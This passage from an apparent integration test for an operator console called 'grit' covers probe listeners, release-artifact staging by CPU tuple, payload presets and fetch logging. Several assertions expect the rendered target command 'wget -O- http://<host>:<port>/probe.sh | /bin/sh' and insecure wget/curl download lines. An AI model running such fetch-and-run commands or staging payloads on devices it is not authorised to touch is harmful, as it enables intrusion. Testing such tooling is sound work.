        release_stage_events = (line_release_doc.get("events_by_event") or {}).get("workbench_release_artifact_staged") or []
        release_view_events = (line_release_doc.get("events_by_event") or {}).get("workbench_release_console_viewed") or []
        if (not release_stage_events or
                (release_stage_events[-1].get("details") or {}).get("selector") != "by_tuple_path:by-tuple/native/host/host/host" or
                (release_stage_events[-1].get("details") or {}).get("direct_console") is not True or
                not release_view_events or
                "--stage-release-artifact by_tuple_path:by-tuple/native/host/host/host" not in ((release_stage_events[-1].get("details") or {}).get("headless_command") or "")):
            print("line-oriented console did not record release staging event", file=sys.stderr)
            print(json.dumps(line_release_doc, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        probe_release_dir = Path(tmp) / "dist/releases/probe-release"
        probe_release_operator = Path(tmp) / "operator-session-probe-release"
        probe_release_state = probe_release_operator / "state.json"
        probe_release_staged = probe_release_operator / "staged.json"
        probe_release_cfg = Path(tmp) / "probe-release-config.json"
        probe_release_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_SERVER_HOST": advertised_operator_host,
            "operator_session_dir": str(probe_release_operator),
            "server_state": str(probe_release_state),
            "staged_files": str(probe_release_staged),
            "GRIT_OPERATOR_FILE_SERVICE_PORT": free_port(),
            "GRIT_PROBE_PORT": free_port(),
            "GRIT_PROBE_TFTP_PORT": free_port(),
            "GRIT_PROBE_FTP_PORT": free_port(),
            "GRIT_PROBE_DNS_PORT": free_port(),
            "GRIT_PROBE_DNS_NAME": "probe.test",
        }), encoding="utf-8")
        no_release_cfg = Path(tmp) / "probe-no-release-config.json"
        no_release_doc = json.loads(probe_release_cfg.read_text(encoding="utf-8"))
        no_release_doc["release_dir"] = str(Path(tmp) / "missing-release")
        no_release_cfg.write_text(json.dumps(no_release_doc, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        probe_listener_preview = subprocess.run(
            [
                str(server),
                "--config", str(probe_release_cfg),
                "--transport", "probe",
                "--timeout", "0.1",
                "--one-shot",
            ],
            cwd=tmp,
            text=True,
            capture_output=True,
        )
        probe_listener_text = probe_listener_preview.stdout + probe_listener_preview.stderr
        probe_port = json.loads(probe_release_cfg.read_text(encoding="utf-8"))["GRIT_PROBE_PORT"]
        if (probe_listener_preview.returncode != 1 or
                f"Probe listener. Binding on http://127.0.0.1:{probe_port}/probe.sh" not in probe_listener_text or
                f"Probe target URL: http://{advertised_operator_host}:{probe_port}/probe.sh" not in probe_listener_text or
                f"Target command: wget -O- http://{advertised_operator_host}:{probe_port}/probe.sh | /bin/sh" not in probe_listener_text or
                f"Advertised target endpoint: {advertised_operator_host}:{probe_port}" not in probe_listener_text or
                f"* {advertised_operator_host}:{probe_port}" not in probe_listener_text or
                "Traceback" in probe_listener_text):
            print("probe listener did not clearly separate bind and advertised target endpoints", file=sys.stderr)
            print(probe_listener_text, file=sys.stderr)
            return 1
        probe_ftp_preview = subprocess.run(
            [
                str(server),
                "--config", str(probe_release_cfg),
                "--transport", "probe-ftp",
                "--timeout", "0.1",
                "--one-shot",
            ],
            cwd=tmp,
            text=True,
            capture_output=True,
        )
        probe_ftp_text = probe_ftp_preview.stdout + probe_ftp_preview.stderr
        probe_cfg_doc = json.loads(probe_release_cfg.read_text(encoding="utf-8"))
        probe_ftp_port = probe_cfg_doc["GRIT_PROBE_FTP_PORT"]
        if (probe_ftp_preview.returncode != 1 or
                f"Probe FTP listener. Binding on ftp://127.0.0.1:{probe_ftp_port}/probe.sh" not in probe_ftp_text or
                f"Probe FTP target URL: ftp://{advertised_operator_host}:{probe_ftp_port}/probe.sh" not in probe_ftp_text or
                f"Target command: wget -O- ftp://{advertised_operator_host}:{probe_ftp_port}/probe.sh | /bin/sh" not in probe_ftp_text or
                "Traceback" in probe_ftp_text):
            print("probe FTP listener preview did not render expected target command", file=sys.stderr)
            print(probe_ftp_text, file=sys.stderr)
            return 1
        probe_dns_preview = subprocess.run(
            [
                str(server),
                "--config", str(probe_release_cfg),
                "--transport", "probe-dns",
                "--timeout", "0.1",
                "--one-shot",
            ],
            cwd=tmp,
            text=True,
            capture_output=True,
        )
        probe_dns_text = probe_dns_preview.stdout + probe_dns_preview.stderr
        probe_dns_port = probe_cfg_doc["GRIT_PROBE_DNS_PORT"]
        if (probe_dns_preview.returncode != 1 or
                f"Probe DNS listener. Binding on dns://127.0.0.1:{probe_dns_port}/probe.test" not in probe_dns_text or
                "Probe DNS TXT name: probe.test" not in probe_dns_text or
                f"dig @{advertised_operator_host} -p {probe_dns_port} +short TXT probe.test" not in probe_dns_text or
                "DNS note: nslookup usually needs this service exposed on port 53" not in probe_dns_text or
                "Traceback" in probe_dns_text):
            print("probe DNS listener preview did not render expected target command", file=sys.stderr)
            print(probe_dns_text, file=sys.stderr)
            return 1
        probe_status = subprocess.run(
            [
                str(server),
                "--config", str(probe_release_cfg),
                "--json-status",
            ],
            cwd=tmp,
            text=True,
            capture_output=True,
        )
        if probe_status.returncode != 0:
            print("probe status failed", file=sys.stderr)
            print(probe_status.stderr, file=sys.stderr)
            return 1
        probe_status_doc = json.loads(probe_status.stdout)
        probe_services = {rec.get("name"): rec for rec in probe_status_doc.get("services") or []}
        if (probe_services.get("probe-ftp", {}).get("port") != probe_ftp_port or
                probe_services.get("probe-ftp", {}).get("protocol") != "tcp" or
                probe_services.get("probe-dns", {}).get("port") != probe_dns_port or
                probe_services.get("probe-dns", {}).get("protocol") != "udp"):
            print("probe FTP/DNS services missing from json status", file=sys.stderr)
            print(probe_status.stdout, file=sys.stderr)
            return 1
        probe_release_operator.mkdir(parents=True, exist_ok=True)
        (probe_release_operator / "probe-results.json").write_text(json.dumps({
            "schema": 1,
            "results": [
                {
                    "received_at": "2026-01-01T00:00:00Z",
                    "remote_addr": "192.0.2.11:50001",
                    "uname_s": "Linux",
                    "uname_m": "mips",
                    "uname_r": "5.10.176",
                    "word_bits": "32",
                    "endian": "little",
                    "status": "received",
                }
            ],
        }, indent=2) + "\n", encoding="utf-8")
        no_release_master, no_release_slave = pty.openpty()
        try:
            no_release_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(no_release_cfg),
                    "--state-file", str(probe_release_state),
                    "--staged-file", str(probe_release_staged),
                ],
                cwd=tmp,
                stdin=no_release_slave,
                stdout=no_release_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(no_release_slave)
            no_release_slave = -1
            time.sleep(0.3)
            os.write(no_release_master, b"probe serve\nq\n")
            no_release_output = b""
            deadline = time.time() + 8
            while no_release_proc.poll() is None and time.time() < deadline:
                readable, _, _ = select.select([no_release_master], [], [], 0.1)
                if readable:
                    try:
                        no_release_output += os.read(no_release_master, 65536)
                    except OSError:
                        break
            if no_release_proc.poll() is None:
                no_release_proc.terminate()
                try:
                    no_release_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    no_release_proc.kill()
                    no_release_proc.wait(timeout=2)
            no_release_stderr = no_release_proc.stderr.read()
        finally:
            if no_release_slave != -1:
                os.close(no_release_slave)
            try:
                os.close(no_release_master)
            except OSError:
                pass
        no_release_text = no_release_output.decode("utf-8", errors="replace")
        if (no_release_proc.returncode != 0 or
                "Traceback" in (no_release_stderr or "") or
                "No release configured." not in no_release_text or
                "Probe needs arch=mipsel kernel_floor=current endian=little" not in no_release_text or
                "Expected tuple shape: by-tuple/mipsel/LIBC/current/CPU" not in no_release_text or
                "Expected artifact stem: grit-mipsel-linux-current-LIBC-PRESET" not in no_release_text or
                "Common payload presets: builtin-core-shell, survey-core, default, payload-bash, socat-rescue, ssh-operator, full-debug" not in no_release_text or
                "set release_dir /path/to/extracted-release" not in no_release_text or
                "probe serve --start" not in no_release_text):
            print("probe serve without a release did not provide actionable guidance", file=sys.stderr)
            print(no_release_text, file=sys.stderr)
            print(no_release_stderr or "", file=sys.stderr)
            return 1
        (probe_release_dir / "scripts").mkdir(parents=True)
        (probe_release_dir / "bin").mkdir(parents=True)
        mipsel_default = probe_release_dir / "by-tuple/mipsel/musl/4.x/mips32r2-24kc/bin/grit-mipsel-default"
        mipsel_ssh = probe_release_dir / "by-tuple/mipsel/musl/4.x/mips32r2-24kc/bin/grit-mipsel-ssh"
        x86_default = probe_release_dir / "by-tuple/x86_64/musl/4.x/generic/bin/grit-x86-default"
        for path, text in (
                (mipsel_default, "mipsel default\n"),
                (mipsel_ssh, "mipsel ssh\n"),
                (x86_default, "x86 default\n")):
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text, encoding="utf-8")
            path.chmod(0o755)
            flat_path = probe_release_dir / "bin" / path.name
            flat_path.write_text(text, encoding="utf-8")
            flat_path.chmod(0o755)
            (probe_release_dir / "bin" / f"{path.name}.sha256").write_text(f"hash  {path.name}\n", encoding="utf-8")
        probe_release_json = {
            "schema": 1,
            "release_name": "probe-release-smoke",
            "layout": {
                "devices": {},
                "tuples": {
                    "by-tuple/mipsel/musl/4.x/mips32r2-24kc": {
                        "tuple": {"arch": "mipsel", "libc": "musl", "kernel_floor": "4.x", "cpu": "mips32r2-24kc"},
                        "artifacts": [
                            "by-tuple/mipsel/musl/4.x/mips32r2-24kc/bin/grit-mipsel-default",
                            "by-tuple/mipsel/musl/4.x/mips32r2-24kc/bin/grit-mipsel-ssh",
                        ],
                    },
                    "by-tuple/x86_64/musl/4.x/generic": {
                        "tuple": {"arch": "x86_64", "libc": "musl", "kernel_floor": "4.x", "cpu": "generic"},
                        "artifacts": ["by-tuple/x86_64/musl/4.x/generic/bin/grit-x86-default"],
                    },
                },
            },
        }
        probe_release_index = {
            "schema": 1,
            "release_name": "probe-release-smoke",
            "devices": {},
            "tuples": probe_release_json["layout"]["tuples"],
            "artifacts": [
                {
                    "artifact": "bin/grit-x86-default",
                    "tuple_artifact": "by-tuple/x86_64/musl/4.x/generic/bin/grit-x86-default",
                    "tuple_path": "by-tuple/x86_64/musl/4.x/generic",
                    "payload_preset": "default",
                    "sha256": "x86",
                    "compatibility": {"label": "exact", "reasons": ["x86 fixture"]},
                },
                {
                    "artifact": "bin/grit-mipsel-default",
                    "tuple_artifact": "by-tuple/mipsel/musl/4.x/mips32r2-24kc/bin/grit-mipsel-default",
                    "tuple_path": "by-tuple/mipsel/musl/4.x/mips32r2-24kc",
                    "payload_preset": "default",
                    "sha256": "mipsel-default",
                    "compatibility": {"label": "exact", "reasons": ["mipsel fixture"]},
                },
                {
                    "artifact": "bin/grit-mipsel-ssh",
                    "tuple_artifact": "by-tuple/mipsel/musl/4.x/mips32r2-24kc/bin/grit-mipsel-ssh",
                    "tuple_path": "by-tuple/mipsel/musl/4.x/mips32r2-24kc",
                    "payload_preset": "ssh-operator",
                    "sha256": "mipsel-ssh",
                    "compatibility": {"label": "exact", "reasons": ["mipsel fixture"]},
                },
            ],
        }
        (probe_release_dir / "release.json").write_text(json.dumps(probe_release_json, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        (probe_release_dir / "release-index.json").write_text(json.dumps(probe_release_index, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        probe_release_operator.mkdir(parents=True, exist_ok=True)
        (probe_release_operator / "probe-results.json").write_text(json.dumps({
            "schema": 1,
            "results": [
                {
                    "received_at": "2025-12-31T23:59:00Z",
                    "remote_addr": "192.0.2.10:50000",
                    "uname_s": "Linux",
                    "uname_m": "x86_64",
                    "uname_r": "4.19.0",
                    "word_bits": "64",
                    "endian": "little",
                    "status": "received",
                },
                {
                    "received_at": "2026-01-01T00:00:00Z",
                    "remote_addr": "192.0.2.11:50001",
                    "uname_s": "Linux",
                    "uname_m": "mips",
                    "uname_r": "5.10.176",
                    "word_bits": "32",
                    "endian": "little",
                    "status": "received",
                }
            ],
        }, indent=2) + "\n", encoding="utf-8")
        probe_master, probe_slave = pty.openpty()
        try:
            probe_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(probe_release_cfg),
                    "--state-file", str(probe_release_state),
                    "--staged-file", str(probe_release_staged),
                ],
                cwd=tmp,
                stdin=probe_slave,
                stdout=probe_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(probe_slave)
            probe_slave = -1
            time.sleep(0.3)
            os.write(probe_master, b"probe results\n2\nprobe config 1\nprobe clear 2\nprobe results\nprobe serve\n1\nq\nq\n")
            probe_output = b""
            deadline = time.time() + 8
            while probe_proc.poll() is None and time.time() < deadline:
                readable, _, _ = select.select([probe_master], [], [], 0.1)
                if readable:
                    try:
                        probe_output += os.read(probe_master, 65536)
                    except OSError:
                        break
            if probe_proc.poll() is None:
                probe_proc.terminate()
                try:
                    probe_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    probe_proc.kill()
                    probe_proc.wait(timeout=2)
            probe_stderr = probe_proc.stderr.read()
        finally:
            if probe_slave != -1:
                os.close(probe_slave)
            try:
                os.close(probe_master)
            except OSError:
                pass
        probe_text = probe_output.decode("utf-8", errors="replace")
        if (probe_proc.returncode != 0 or
                "Traceback" in (probe_stderr or "") or
                "Probe results  (2 received)" not in probe_text or
                "Using probe result 2 (2025-12-31T23:59:00Z)" not in probe_text or
                "GRIT_TARGET_ARCH=x86_64" not in probe_text or
                "Using probe result 1 (2026-01-01T00:00:00Z)" not in probe_text or
                "GRIT_TARGET_ARCH=mipsel" not in probe_text or
                "GRIT_KERNEL_FLOOR=current" not in probe_text or
                "removed probe result 2: 2025-12-31T23:59:00Z 192.0.2.10:50000" not in probe_text or
                "cleared 1 probe result(s)" not in probe_text or
                "Probe results  (1 received)" not in probe_text or
                "Probe arch: mipsel" not in probe_text or
                "floor: current" not in probe_text or
                f"Using release: {probe_release_dir}" not in probe_text or
                "Available for mipsel  (2 found)" not in probe_text or
                "default               by-tuple/mipsel/musl/4.x/mips32r2-24kc" not in probe_text or
                "ssh-operator          by-tuple/mipsel/musl/4.x/mips32r2-24kc" not in probe_text or
                "by-tuple/mipsel/musl/4.x/mips32r2-24kc" not in probe_text or
                "by-tuple/x86_64/musl/4.x/generic" in probe_text or
                "  1  -                     -" in probe_text or
                "Staging default: by_tuple_payload_preset:by-tuple/mipsel/musl/4.x/mips32r2-24kc:default" not in probe_text or
                "Release artifact staged:" not in probe_text or
                "Target fetch options:" not in probe_text or
                f"https://{advertised_operator_host}:" not in probe_text or
                f"--host {advertised_operator_host}" not in probe_text or
                "wget --no-check-certificate -O ./grit-mipsel-default " not in probe_text or
                "curl -fLk -o ./grit-mipsel-default " not in probe_text or
                "nc:    requires file-service TLS=no" not in probe_text or
                "/fetch?name=grit-mipsel-default" not in probe_text or
                "grit-mipsel-default" not in probe_text):
            print("probe serve did not choose the matching release tuple", file=sys.stderr)
            print(probe_text, file=sys.stderr)
            print(probe_stderr or "", file=sys.stderr)
            return 1
        probe_staged = json.loads(probe_release_staged.read_text(encoding="utf-8"))
        staged_probe = (probe_staged.get("staged") or {}).get("grit-mipsel-default") or {}
        if (staged_probe.get("tuple_path") != "by-tuple/mipsel/musl/4.x/mips32r2-24kc" or
                staged_probe.get("payload_preset") != "default" or
                "x86" in json.dumps(probe_staged)):
            print("probe serve staged the wrong release artifact", file=sys.stderr)
            print(json.dumps(probe_staged, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        target_release_state = Path(tmp) / "operator-session" / "target-release-state.json"
        target_release_staged = Path(tmp) / "operator-session" / "target-release-staged.json"
        target_release_targets = Path(tmp) / "operator-session" / "target-release-targets.json"
        target_release_label = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(target_release_state),
                "--staged-file", str(target_release_staged),
                "--targets-file", str(target_release_targets),
                "--set-target-label", "target-release",
                "--target-label", "Release Router",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if target_release_label.returncode != 0:
            print("target release workflow label setup failed", file=sys.stderr)
            print(target_release_label.stdout, file=sys.stderr)
            print(target_release_label.stderr, file=sys.stderr)
            return 1
        target_release_stage = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(target_release_state),
                "--staged-file", str(target_release_staged),
                "--targets-file", str(target_release_targets),
                "--run-target-workflow-action", "target-release:stage-release-artifact",
                "--target-workflow-command", "by_device:lab-router",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if (target_release_stage.returncode != 0 or
                "target workflow action: target-release:stage-release-artifact" not in target_release_stage.stdout or
                "staged grit-test" not in target_release_stage.stdout or
                "target=target-release label=Release Router" not in target_release_stage.stdout or
                "release_path=bin/grit-test" not in target_release_stage.stdout or
                "grit fetch grit-test" not in target_release_stage.stdout):
            print("target release workflow stage action failed", file=sys.stderr)
            print(target_release_stage.stdout, file=sys.stderr)
            print(target_release_stage.stderr, file=sys.stderr)
            return 1
        target_release_status = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(target_release_state),
                "--staged-file", str(target_release_staged),
                "--targets-file", str(target_release_targets),
                "--event-limit", "16",
                "--json-status",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        target_release_doc = json.loads(target_release_status.stdout)
        target_release_staged_records = (target_release_doc.get("staged_by_target_id") or {}).get("target-release") or []
        target_release_actions = (target_release_doc.get("target_workflow_actions_by_target_id") or {}).get("target-release") or []
        target_release_actions_by_action = {
            rec.get("action_id"): rec for rec in target_release_actions if isinstance(rec, dict)
        }
        target_release_events = target_release_doc.get("events_by_event") or {}
        target_release_completed = [
            event.get("details") or {}
            for event in target_release_events.get("target_workflow_action_completed", [])
            if (event.get("details") or {}).get("action_id") == "stage-release-artifact"
        ]
        if (target_release_status.returncode != 0 or
                target_release_doc.get("summary", {}).get("target_workflow_action_count") != 10 or
                target_release_doc.get("summary", {}).get("target_workflow_action_workflow_counts", {}).get("release-artifact") != 1 or
                target_release_doc.get("summary", {}).get("target_workflow_action_requires_input_count") != 5 or
                target_release_doc.get("summary", {}).get("target_workflow_action_queues_offline_work_count") != 5 or
                target_release_doc.get("summary", {}).get("target_workflow_action_target_phone_home_required_count") != 7 or
                len(target_release_staged_records) != 1 or
                target_release_staged_records[0].get("stage_kind") != "release-artifact" or
                target_release_staged_records[0].get("target_id") != "target-release" or
                target_release_staged_records[0].get("target_label") != "Release Router" or
                target_release_staged_records[0].get("release_path") != "bin/grit-test" or
                target_release_staged_records[0].get("tuple_path") != "by-tuple/native/host/host/host" or
                target_release_actions_by_action.get("stage-release-artifact", {}).get("requires_input") is not True or
                target_release_actions_by_action.get("stage-release-artifact", {}).get("queues_offline_work") is not True or
                target_release_actions_by_action.get("stage-release-artifact", {}).get("target_phone_home_required") is not True or
                "RELEASE_SELECTOR" not in target_release_actions_by_action.get("stage-release-artifact", {}).get("headless_command", "") or
                not target_release_completed or
                target_release_completed[-1].get("result") != "staged-release-artifact" or
                target_release_completed[-1].get("selector") != "by_device:lab-router" or
                target_release_completed[-1].get("target_id") != "target-release" or
                target_release_completed[-1].get("release_path") != "bin/grit-test" or
                target_release_completed[-1].get("tuple_path") != "by-tuple/native/host/host/host"):
            print("target release workflow status missing staged release metadata", file=sys.stderr)
            print(json.dumps(target_release_doc, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        staged_status = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--json-status",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        staged_doc = json.loads(staged_status.stdout)
        release_staged = staged_doc.get("staged", {}).get("grit-test", {})
        release_staged_by_kind = staged_doc.get("staged_by_kind") or {}
        release_staged_summary = staged_doc.get("summary") or {}
        if (release_staged.get("stage_kind") != "release-artifact" or
                release_staged.get("release_path") != "bin/grit-test" or
                release_staged.get("tuple_path") != "by-tuple/native/host/host/host" or
                release_staged.get("payload_preset") != "default" or
                (release_staged.get("compatibility") or {}).get("label") != "exact" or
                release_staged_by_kind.get("release-artifact", [{}])[0].get("request_name") != "grit-test" or
                release_staged_summary.get("staged_kind_counts", {}).get("release-artifact") != 1):
            print("json status missing release artifact staged metadata", file=sys.stderr)
            print(staged_status.stdout, file=sys.stderr)
            return 1
        fetch_records = [
            rec for rec in staged_doc.get("target_command_records") or []
            if rec.get("request_name") == "grit-test"
        ]
        if (not fetch_records or
                fetch_records[0].get("source_path") != str(release_dir / "bin" / "grit-test") or
                fetch_records[0].get("stage_kind") != "release-artifact" or
                fetch_records[0].get("release_path") != "bin/grit-test" or
                fetch_records[0].get("tuple_path") != "by-tuple/native/host/host/host" or
                fetch_records[0].get("payload_preset") != "default" or
                (fetch_records[0].get("compatibility") or {}).get("label") != "exact" or
                fetch_records[0].get("network") is not True or
                fetch_records[0].get("executes_operator_supplied_commands") is not False):
            print("json status missing structured staged fetch command metadata", file=sys.stderr)
            print(staged_status.stdout, file=sys.stderr)
            return 1
        staged_commands_by_request = staged_doc.get("target_commands_by_request") or {}
        staged_commands_by_stage_kind = staged_doc.get("target_commands_by_stage_kind") or {}
        staged_commands_by_release_path = staged_doc.get("target_commands_by_release_path") or {}
        staged_commands_by_service_purpose = staged_doc.get("target_commands_by_service_purpose") or {}
        staged_commands_by_explicit_action = staged_doc.get("target_commands_by_requires_explicit_target_action") or {}
        staged_commands_by_operator_supplied = staged_doc.get("target_commands_by_executes_operator_supplied_commands") or {}
        if (staged_commands_by_request.get("grit-test", {}).get("source_path") != str(release_dir / "bin" / "grit-test") or
                staged_commands_by_request.get("grit-test", {}).get("release_path") != "bin/grit-test" or
                staged_commands_by_stage_kind.get("release-artifact", [{}])[0].get("request_name") != "grit-test" or
                staged_commands_by_release_path.get("bin/grit-test", [{}])[0].get("request_name") != "grit-test" or
                staged_doc.get("summary", {}).get("target_command_stage_kind_counts", {}).get("release-artifact") != 1 or
                staged_doc.get("summary", {}).get("target_command_release_path_counts", {}).get("bin/grit-test") != 1 or
                not any(item.get("request_name") == "grit-test" for item in staged_commands_by_explicit_action.get("True", [])) or
                staged_commands_by_operator_supplied.get("True", []) != [] or
                staged_commands_by_service_purpose.get("file-service:explicitly fetch an operator-staged file", [{}])[0].get("request_name") != "grit-test"):
            print("json status missing staged fetch command request lookup", file=sys.stderr)
            print(staged_status.stdout, file=sys.stderr)
            return 1
        staged_browser_by_kind_source = staged_doc.get("browser_paths_by_kind_source_id") or {}
        staged_browser_by_stage_kind = staged_doc.get("browser_paths_by_stage_kind") or {}
        staged_browser_by_release_path = staged_doc.get("browser_paths_by_release_path") or {}
        staged_source_browser = staged_browser_by_kind_source.get("staged-source:grit-test", [{}])[0]
        if (staged_source_browser.get("stage_kind") != "release-artifact" or
                staged_source_browser.get("release_path") != "bin/grit-test" or
                staged_source_browser.get("tuple_path") != "by-tuple/native/host/host/host" or
                (staged_source_browser.get("compatibility") or {}).get("label") != "exact" or
                staged_browser_by_stage_kind.get("release-artifact", [{}])[0].get("source_id") != "grit-test" or
                staged_browser_by_release_path.get("bin/grit-test", [{}])[0].get("source_id") != "grit-test" or
                staged_doc.get("summary", {}).get("browser_path_stage_kind_counts", {}).get("release-artifact") != 1 or
                staged_doc.get("summary", {}).get("browser_path_release_path_counts", {}).get("bin/grit-test", 0) < 1):
            print("json status missing staged browser release metadata", file=sys.stderr)
            print(staged_status.stdout, file=sys.stderr)
            return 1

        bad_stage = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
            "--transport", "file-service",
            "--serve-file", str(staged_source),
            "--as", "../bad",
            "--timeout", "0.01",
        )
        if bad_stage.returncode == 0 or "path traversal" not in (bad_stage.stdout + bad_stage.stderr):
            print("staged path traversal was not rejected", file=sys.stderr)
            return 1

        proc = subprocess.Popen(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--transport", "file-service",
                "--serve-file", str(staged_source),
                "--as", "/tmp/myfile",
                "--file-service-tls", "no",
                "--one-shot",
                "--timeout", "5",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        request = (
            "GET /fetch?name=%2Ftmp%2Fmyfile HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "\r\n"
        ).encode("ascii")
        response = connect_with_retry(fetch_port, request)
        stdout, stderr = proc.communicate(timeout=5)
        if proc.returncode != 0:
            print("staged fetch server exited nonzero:", file=sys.stderr)
            print(stdout, file=sys.stderr)
            print(stderr, file=sys.stderr)
            return 1
        if b"HTTP/1.1 200 OK" not in response or not response.endswith(b"operator staged bytes\n"):
            print("staged fetch did not return the staged file:", file=sys.stderr)
            print(response.decode("utf-8", errors="replace"), file=sys.stderr)
            return 1
        fetch_sessions = list((Path(tmp) / "sessions-fetch").glob("*/session.json"))
        if len(fetch_sessions) != 1:
            print("staged fetch did not write a session record", file=sys.stderr)
            return 1
        fetch_session_doc = json.loads(fetch_sessions[0].read_text(encoding="utf-8"))
        if (len(fetch_session_doc.get("fetches") or []) != 1 or
                fetch_session_doc["fetches"][0].get("operation") != "fetch" or
                fetch_session_doc["fetches"][0].get("status") != "served" or
                fetch_session_doc["fetches"][0].get("http_status") != 200 or
                fetch_session_doc.get("uploads")):
            print("staged fetch session was not classified as fetch-only", file=sys.stderr)
            print(json.dumps(fetch_session_doc, indent=2), file=sys.stderr)
            return 1
        fetch_events = [json.loads(line) for line in (fetch_sessions[0].parent / "events.jsonl").read_text(encoding="utf-8").splitlines()]
        if not any(event.get("event") == "fetch_complete" and event.get("details", {}).get("operation") == "fetch" for event in fetch_events):
            print("staged fetch did not write structured fetch_complete event", file=sys.stderr)
            return 1
        fetch_close_events = [event for event in fetch_events if event.get("event") == "connection_close"]
        if (not fetch_close_events or
                fetch_close_events[-1].get("details", {}).get("operation") != "fetch" or
                fetch_close_events[-1].get("details", {}).get("status") != "served" or
                fetch_close_events[-1].get("details", {}).get("http_status") != 200 or
                fetch_close_events[-1].get("details", {}).get("request_name") != "/tmp/myfile"):
            print("staged fetch connection_close event missing request outcome details", file=sys.stderr)
            return 1
        fetch_status = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
            "--json-status",
        )
        fetch_status_doc = json.loads(fetch_status.stdout)
        fetch_items = fetch_status_doc.get("fetches") or []
        fetch_summary = fetch_status_doc.get("summary", {})
        if (fetch_summary.get("fetch_count") != 1 or
                fetch_summary.get("fetch_total_size") != staged_source.stat().st_size or
                fetch_summary.get("fetch_source_exists_count") != 1 or
                fetch_summary.get("fetch_source_missing_count") != 0 or
                fetch_summary.get("fetch_status_counts", {}).get("served") != 1 or
                fetch_summary.get("fetch_http_status_counts", {}).get("200") != 1 or
                fetch_summary.get("event_detail_request_name_counts", {}).get("/tmp/myfile", 0) < 1 or
                fetch_summary.get("event_type_detail_request_name_counts", {}).get("fetch_complete:/tmp/myfile", 0) < 1 or
                fetch_summary.get("event_service_detail_request_name_counts", {}).get("file-service:/tmp/myfile", 0) < 1 or
                len(fetch_items) != 1 or
                fetch_items[0].get("request_name") != "/tmp/myfile" or
                fetch_items[0].get("status") != "served" or
                fetch_items[0].get("http_status") != 200 or
                fetch_items[0].get("source_exists") is not True or
                fetch_items[0].get("metadata_exists") is not True or
                fetch_items[0].get("event_log_exists") is not True or
                fetch_items[0].get("session_id") != fetch_sessions[0].parent.name or
                fetch_items[0].get("event_log") != str(fetch_sessions[0].parent / "events.jsonl")):
            print("server json status missing recent fetch metadata", file=sys.stderr)
            print(fetch_status.stdout, file=sys.stderr)
            return 1
        fetches_by_session = fetch_status_doc.get("fetches_by_session") or {}
        session_fetches = fetches_by_session.get(fetch_sessions[0].parent.name) or []
        if (len(session_fetches) != 1 or
                session_fetches[0].get("request_name") != "/tmp/myfile" or
                session_fetches[0].get("status") != "served"):
            print("server json status missing fetches_by_session browser grouping", file=sys.stderr)
            print(fetch_status.stdout, file=sys.stderr)
            return 1
        fetches_by_request = fetch_status_doc.get("fetches_by_request") or {}
        fetches_by_sha = fetch_status_doc.get("fetches_by_sha256") or {}
        fetches_by_source = fetch_status_doc.get("fetches_by_source_path") or {}
        fetches_by_source_exists = fetch_status_doc.get("fetches_by_source_exists") or {}
        fetches_by_metadata_exists = fetch_status_doc.get("fetches_by_metadata_exists") or {}
        fetches_by_event_log_exists = fetch_status_doc.get("fetches_by_event_log_exists") or {}
        fetches_by_status = fetch_status_doc.get("fetches_by_status") or {}
        fetches_by_http_status = fetch_status_doc.get("fetches_by_http_status") or {}
        fetches_by_remote = fetch_status_doc.get("fetches_by_remote_addr") or {}
        fetches_by_request_status = fetch_status_doc.get("fetches_by_request_status") or {}
        fetches_by_status_source_exists = fetch_status_doc.get("fetches_by_status_source_exists") or {}
        fetches_by_status_remote = fetch_status_doc.get("fetches_by_status_remote_addr") or {}
        fetches_by_http_status_remote = fetch_status_doc.get("fetches_by_http_status_remote_addr") or {}
        events_api = (fetch_status_doc.get("api_collections") or {}).get("events") or {}
        fetch_sha = fetch_items[0].get("sha256", "")
        fetch_remote = fetch_items[0].get("remote_addr", "")
        fetch_request_status_key = "/tmp/myfile:served"
        fetch_status_source_exists_key = "served:yes"
        fetch_status_remote_key = f"served:{fetch_remote}"
        fetch_http_status_remote_key = f"200:{fetch_remote}"
        if (fetches_by_request.get("/tmp/myfile", [{}])[0].get("status") != "served" or
                not fetch_sha or
                fetches_by_sha.get(fetch_sha, [{}])[0].get("request_name") != "/tmp/myfile" or
                fetches_by_source.get(str(staged_source), [{}])[0].get("http_status") != 200 or
                fetches_by_source_exists.get("yes", [{}])[0].get("request_name") != "/tmp/myfile" or
                fetches_by_metadata_exists.get("yes", [{}])[0].get("request_name") != "/tmp/myfile" or
                fetches_by_event_log_exists.get("yes", [{}])[0].get("request_name") != "/tmp/myfile" or
